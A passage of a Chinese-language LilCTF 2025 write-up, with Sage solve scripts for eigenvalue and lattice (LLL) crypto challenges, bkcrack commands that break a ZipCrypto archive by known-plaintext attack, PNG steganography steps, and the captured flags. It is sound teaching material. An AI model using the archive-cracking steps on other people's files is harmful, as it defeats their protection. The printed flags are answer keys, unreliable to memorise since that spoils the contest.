可能的flag内容 (1): It_w4s_the_be5t_of_times_1t_wa5_the_w0rst_of_t1me5
可能的flag内容 (2): 1t_wa5_the_w0rst_of_t1me5It_w4s_the_be5t_of_times_
```

看起来第一个拼接方式是对的，拿去试试，正确

### mid_math

由 `如果 lambda 是矩阵 M 的一个特征值，那么 lambda**k 就是矩阵 M**k 的一个特征值` 这个性质，则有

设 `lambda_C` 是矩阵 `C` 的一个特征值，`lambda_D` 是矩阵 `D` 对应的一个特征值，那么它们之间必然满足关系：`lambda_D = (lambda_C)**key`

所以先求特征值，又因为 key 的可能性较少，所以再爆破一下，得到 flag

```python
from sage.all import *
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 题目给出的已知数据
p = 14668080038311483271
C_list = [[11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212], [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914], [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670], [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413], [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707]]
D_list = [[1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044], [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372], [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427], [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551], [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395]]
msg = b"\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m'\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j"

# 设置有限域
P = GF(p)

# 建立矩阵对象
C = matrix(P, C_list)
D = matrix(P, D_list)

# 计算特征值
eigenvalues_C = [e for e in C.eigenvalues() if e != 0]
eigenvalues_D = [e for e in D.eigenvalues() if e != 0]

print(f"C 的非零特征值: {eigenvalues_C}")
print(f"D 的非零特征值: {eigenvalues_D}")

# 暴力尝试所有配对来找到正确的 key
# 固定一个 base，遍历所有 target
base = eigenvalues_C[0]
print(f"\n固定 base = {base}")

for target in eigenvalues_D:
    print(f"尝试 target = {target} ...")
    
    # 计算可能的 key
    key_integer = target.log(base)
    key_int = int(key_integer)
    
    # 尝试用这个 key 解密
    try:
        key_bytes_padded = pad(long_to_bytes(key_int), 16)
        cipher = AES.new(key_bytes_padded, AES.MODE_ECB)
        decrypted_msg = unpad(cipher.decrypt(msg), 64)
        
        # unpad 没有报错，key 对了
        print("\n" + "="*40)
        print("成功解密！")
        print(f"正确的整数 key 是: {key_integer}")
        print(f"解密得到的 Flag 是: {decrypted_msg.decode()}")
        print("="*40)
        exit()
        
    except ValueError:
        # key 是错的，padding 会不正确
        print(" -> 解密失败，此配对错误。")
        continue
```

```bash
[helloctfos@LUMINE-LAPTOP mid_math]$ sage solve.py 
C 的非零特征值: [13548047239731931439, 10741008122066331899, 2915915082365181132, 2524362820657834710]
D 的非零特征值: [14219969811373602463, 7805278355513795080, 7126986745593039829, 6321945571561295171]

固定 base = 13548047239731931439
尝试 target = 14219969811373602463 ... 
-> 解密失败，此配对错误。
尝试 target = 7805278355513795080 ...

========================================
成功解密！正确的整数 key 是: 5273966641785501202
解密得到的 Flag 是: LILCTF{Are_y0u_5till_4wake_que5t1on_m4ker!}
========================================
```

### **Linear**

因 `x` 有界（[1, 114514]），考虑 LLL 格基约简。

先将 `A * x = b` 变形为齐次线性方程组：`D * z = 0`，其中 `D = [A | -b]`，`z = [x; 1]`

`D` 的右核为一个格，对其做格基约简，在约简后的所有基中，找到所有分量能被最后一个分量整除的基（`z` 的缩放），检查候选 `x` 是否有界，是否满足 `A * x = b`

```python
import socket
import ast
from sage.all import *

host = 'challenge.xinshi.fun'
port = #port
s = socket.socket()
s.connect((host, port))

data = s.recv(100000).decode()
lines = data.splitlines()
if len(lines) < 2:
    data += s.recv(100000).decode()
    lines = data.splitlines()
A_line = lines[0].strip()
b_line = lines[1].strip()
A = ast.literal_eval(A_line)
b = ast.literal_eval(b_line)

nrows = len(A)
ncols = len(A[0])

D = matrix(ZZ, nrows, ncols + 1)
for i in range(nrows):
    for j in range(ncols):
        D[i, j] = A[i][j]
    D[i, ncols] = -b[i]

AA = matrix(ZZ, A)
bb = vector(ZZ, b)

kernel = D.right_kernel_matrix(ring=ZZ)

L = kernel.LLL()

solution_found = False
for row in L:
    k = row[-1]
    if k == 0:
        continue
    
    if all(x % k == 0 for x in row):
        cand_x = vector(ZZ, [x // k for x in row[:ncols]])
    else:
        continue

    if not all(1 <= x <= 114514 for x in cand_x):
        continue
    
    b_cand = vector(ZZ, [sum(A[i][j] * cand_x[j] for j in range(ncols)) for i in range(nrows)])
    if b_cand == vector(b):
        solution_found = True
        break

if solution_found:
    sol_str = ' '.join(str(num) for num in cand_x) + '\n'
    s.send(sol_str.encode())
    response = s.recv(1024).decode()
    print(response)
    s.close()
else:
    print("轧钢")
```

## MISC

### **v我50(R)**MB

Yakit 一发就有了

![](https://assets.bili33.top/img/LilCTF2025-Writeup/image-20250818003021268.png)

因为content-length长度不正确，导致图片显示不完整，剩下的部分被截断了

![](https://assets.bili33.top/img/LilCTF2025-Writeup/image-20250818003716850.png)

### **提前放出附件**

压缩包题, 没给密码, 压缩包内容是个flag.tar, 显然可以明文攻击, 需要知道的是flag.txt压缩之后就是flag.tar, 所以已知的明文是flag.txt，再根据tar包的结构可以知道后面可以用0来填充, 通过构造可以用bkcrack来攻击

`flag.txt` -> `666c61672e747874`

```PowerShell
.\bkcrack\bkcrack-1.7.1-win64\bkcrack.exe -C ahead.zip -c flag.tar -x 0 666c61672e74787400000000000000000000000000000000
bkcrack 1.7.1 - 2024-12-21
[16:06:51] Z reduction using 17 bytes of known plaintext
100.0 % (17 / 17)
[16:06:51] Attack on 426837 Z values at index 6
Keys: 945815e7 4e7a2163 e46b8f88
76.4 % (326284 / 426837) 
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 326284
[16:08:37] Keys
945815e7 4e7a2163 e46b8f88
```

爆出key之后直接用这个key解密

```PowerShell
.\bkcrack\bkcrack-1.7.1-win64\bkcrack.exe -C ahead.zip -c flag.tar -k 945815e7 4e7a2163 e46b8f88 -d decrypted_flag.tar
bkcrack 1.7.1 - 2024-12-21
[15:54:13] Writing deciphered data decrypted_flag.tar
```

然后直接解压的得到flag: `LILCTF{Z1pCRyp70_1s_n0t_5ecur3}`

### **PNG** **Master**

PNG隐写题, 一共三段flag

第一段: PNG文件尾藏了一段base64, 解出来之后是: 让你难过的事情，有一天，你一定会笑着说出来flag1: `4c494c4354467b`

第二段: LSB里面藏了一段, 提取出来解码: 在我们心里，有一块地方是无法锁住的，那块地方叫做希望flag2: `5930755f3472335f4d`

第三段: binwalk分离PNG, 提取出了一个secret.bin和hint.txt，发现hint.txt有零宽字符隐写, 去网站上解一下

![](https://assets.bili33.top/img/LilCTF2025-Writeup/f3fe125e-f6e9-492a-a3e1-621268ebcf40.png)

按照提示 xor 一下得到第三段flag：flag3: `61733765725f696e5f504e477d`

把三段结合以下然后hex转字符串 `4c494c4354467b5930755f3472335f4d61733765725f696e5f504e477d`

`LILCTF{Y0u_4r3_Mas7er_in_PNG}`

### **是谁没有阅读参赛须知？**

一眼丁真

![](https://assets.bili33.top/img/LilCTF2025-Writeup/image-20250818003457732.png)